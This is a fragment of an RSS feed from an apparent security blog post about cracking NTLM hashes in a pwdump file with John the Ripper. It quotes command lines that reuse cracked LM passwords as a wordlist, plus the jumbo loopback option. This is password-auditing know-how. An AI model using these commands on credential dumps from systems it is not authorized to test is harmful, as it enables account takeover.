+&lt;p&gt;Solar Designer (JtR&amp;rsquo;s main dev) suggested the following path:&lt;/p&gt;
+
+&lt;p&gt;[](&lt;a href=&#34;http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ee4b0b79cd4cd3c3f/1351091037907/Windows-Live-Writer-lm2ntlm-with_846B-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ee4b0b79cd4cd3c40/1351091038237/Windows-Live-Writer-lm2ntlm-with_846B-&#34;&gt;http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ee4b0b79cd4cd3c3f/1351091037907/Windows-Live-Writer-lm2ntlm-with_846B-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ee4b0b79cd4cd3c40/1351091038237/Windows-Live-Writer-lm2ntlm-with_846B-&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;A bit hard to read but here are the commands:&lt;/p&gt;
+
+&lt;p&gt;./john -show pwdump.txt | cut -d: -f2 &amp;gt; cracked&lt;br /&gt;
+./john -w=cracked -rules:nt -format=nt pwdump.txt&lt;/p&gt;
+
+&lt;p&gt;As you can see (if you squint) that works well. Rich Rumble suggested:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/3&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/3&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;using the loopback as so:&lt;br /&gt;
+./john pwdump.txt -format=nt -loopback=john.pot -rules=nt&lt;/p&gt;
+
+&lt;p&gt;The loopback been an amazing addition that is as Solar Designer put it &amp;ldquo;not in core JtR, it is a fairly recent addition to jumbo&amp;rdquo;. The loopback allows you to use previously cracked passwords as a dictionary without doing any cut/awk/sed voodoo. The problem with the suggested method for going from LM to NTLM and the loopback option is that it (rightly so) identifies LM hashes by their halves. When it tries to use those halves to crack the NTLM, every with the NT rule-set, it sees each half as separate passwords to try, so it fails.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
